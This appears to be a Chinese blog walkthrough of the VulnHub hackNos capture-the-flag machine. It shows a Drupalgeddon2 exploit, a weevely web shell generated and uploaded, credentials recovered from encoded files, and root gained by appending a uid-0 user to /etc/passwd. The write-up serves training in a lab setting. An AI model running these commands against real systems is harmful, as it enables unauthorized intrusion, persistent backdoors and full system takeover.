> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/varvz4O5pTaHl8qc6sOhAA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **52** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/hacknos-os-hacknos,401/

靶机难度：中级（CTF）-- 本人做完觉得是初级！！

靶机发布日期：2019 年 11 月 27 日

靶机描述：

Difficulty : Easy to Intermediate

Flag : 2 Flag first user And second root

Learning : exploit | Web Application | Enumeration | Privilege Escalation

Website : www.hackNos.com

mail : contact@hackNos.com

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/xVzbJNmGHSCH5d0fX1bHZYbyKoFLsiapvaq5K6Oo80wFkVAmt04DEn4DSiagPY4oL5QTcTlFhJZsA5mbTUZTJFYQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/C77dS0w9GZVLicWdZY3f1CoqQlg8THxKbvmQR0nmh21fJEJZa7vjXvjic0MOJjuiaNk89HqvfhGxBvLN0vp7bkLibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaVibJHQPeE64DTIwyLwrG4bXljKDhAWicjW9In31opnlT4A26iaRAOUm2A/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiafUIWoCPu7pTk5Lhh48d4js4G5B99q7X9t7VjMFtiansOvodwBIloLzQ/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.143

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwia2rpYjCiag77BibHJAmbgM0sDaYibvvfRjqsCrEceDTV4WuPdQE0IT5qLA/640?wx_fmt=png)

nmap 发现开放了 22、80 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiauEhTUyB8wT5JjbhMXsIR9CfPPmDO8atrDo9CeQ4B7jz4jTliczH9EVw/640?wx_fmt=png)

80 是个 apache2... 爆破看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaaEicMA0zFHryZVicR5iaI2LbRLr9xSWJq0QAXr1cGpJGqmTObO9fI42Ww/640?wx_fmt=png)

发现 drupal...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaTZ209moFGSYaTMbKGa6uugqibE3EHicSdMeofq07OUxb5efFU4NYTXBA/640?wx_fmt=png)

这边利用 Droopescan 进行扫描（Droopescan 是一款基于插件的扫描器，可帮助安全研究人员发现 Drupal，SilverStripe，Wordpress，Joomla（枚举版本信息和可利用 URL 地址）和 Moodle 的问题）

这边当然也可以用 dirb，dirbuster 等等，Droopescan 比较好针对 drupal...[安装连接](https://github.com/droope/droopescan)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaCljuoc8TCCSIsmjz76RwXGHUW9PIatcciaKkfpNIwXTFZpKOXTibRCbw/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/C77dS0w9GZVLicWdZY3f1CoqQlg8THxKbvmQR0nmh21fJEJZa7vjXvjic0MOJjuiaNk89HqvfhGxBvLN0vp7bkLibw/640?wx_fmt=png)

  

  

方法 1：

  

  

drupal7.57 的版本...

两种方法：一种直接利用 MSF，一种利用 python 脚本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaTYaSOZpjvVcicOeibicIVsPfjl2Y81bIzic1ZRqPoIo7NYvPajGFNAwh2Q/640?wx_fmt=png)

MSF 内核直接拿到 shell...

  

  

方法 2：

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaeNpOpjAWib9hO6gkjxtKhoFnySP8QU4MKiaj95utzOFFxHApp2DANTOg/640?wx_fmt=png)

```
git clone https://github.com/dreadlocked/Drupalgeddon2.git
```

先在 github 上下载该 exp... 如果执行和我一样报错，需要下载 `

gem  install highline` 因为在运行该 exp 前，需要预装依赖包 highline... 看下图

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaq5XWeKq0UdYbgScB5N97N4tJ6aqK40aj8SYekBP4CVSt7WRbssRqIg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaToz7nvwQDRwSUB4R1h1lOYxrGNrObGog0b7x1u41ERSrwticsE39iasA/640?wx_fmt=png)

成功获得 www-data 权限，但是这里想获得 TTY 必须利用木马工具...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaflwRLCWSVjbdDibBE2eqlhZ6V28kUp343FIWAKKfxFWgnBJ8LnDhZQw/640?wx_fmt=png)

```
weevely generate cmd ./xiaoma.php
```

生成木马... 然后上传上去即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiah4MIxJcKNicibalBv2Zf4WYO6FLB88TXuSrDkgEaTLdrZ6u4KjMb4drQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiavAVrQkAY2YwRp4p4qGmp3pIKuk9CmDFIuBcy39ySJZGh23eZG7ETSA/640?wx_fmt=png)

```
weevely http://192.168.56.143/drupal/xiaoma.php cmd
```

成功...

  

  

方法 3：

  

  

直接在链接下载 py，利用 python3 即可提权...

```
https://www.exploit-db.com/exploits/44448
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

获得 TTY... 不演示了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaMyANzeibNTz5JzibRiawFzib6GOaT0icrr7xfnric0dSX1IHxX1NLe7GY0Bw/640?wx_fmt=png)

成功获得 user...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaLSwxnO2GePf899B1Bkhk5LYKVbEicOwno30QzibcSO6icEdAfYEPBAP6Q/640?wx_fmt=png)

在 html 页面目录发现了 alexander.txt...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwia7JIiaZiaHticWNBjHowZZ4KYticRicojia9y3rKgsxUguBzTnVjGsRDiczU5A/640?wx_fmt=png)

一看就知道 base64 编码，解码...

这是 brainfuck 加密后的字符串... 解码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaA9kfiaXMmC3JatIUEDdCaZ7yUkUomlThga96Ajr9Vrz5vWQ1pD9O8Bg/640?wx_fmt=png)

```
[解码链接](https://www.splitbrain.org/services/ook)
james:Hacker@4514
```

我尝试在数据库看看能不能也找到密码... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaJh6m0V3ItUNth73icdhDCns4QDNxlhZKLAFvau4adJqApBwSr0RM4Zw/640?wx_fmt=png)

发现数据库用户密码：

```
cuppauser、Akrn@4514
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaCwXggFnWBQm3XpGV1g1oVkrdmLBpMFFRCOqd14ibicAqwerO4GLewDMQ/640?wx_fmt=png)

这儿也能看到，但是无法解析... 跳过

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaRsjVhsuBST8Ag6lIBaF5Kmk9uDdDiccicVib7tsSEUdWUp4zFu6ibG9Pdw/640?wx_fmt=png)

这里可以 wget 和 sudo，但是 sudo -l 需要密码... 这里直接利用 wget 替换本地的 passwd 即可提权 root... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiakR6rleyBT8FMB6PS7pzicnjJk1ag4N4zjm4piaJIaiaGcQtHsCyE2JEXQ/640?wx_fmt=png)

```
openssl passwd -1 -salt dayu dayu
echo 'dayu:$1$dayu$/Cg/PH1Ew3w37.fLDfjX8/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

在本地生成 root 权限用户 dayu... 开启本地服务

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaH2qcfeMJTNknmA2dvO7VODgNich82WQruw4kyuKfP8buBg7okic8tiaQw/640?wx_fmt=png)提权即可..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPWxDwUL9fsC1gZyF6uoRwiaOC8KiaSeiae4hOLrBfYQK9q0NPp2QicOrfBPtUxAEoaFvK47dMsga3lFQ/640?wx_fmt=png)

成功获得 root 权限并查看两个 flag...

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

当然方法很多种，千变万化，理解原理即可！！！加油！！！

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/xVzbJNmGHSCH5d0fX1bHZYbyKoFLsiapvaq5K6Oo80wFkVAmt04DEn4DSiagPY4oL5QTcTlFhJZsA5mbTUZTJFYQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)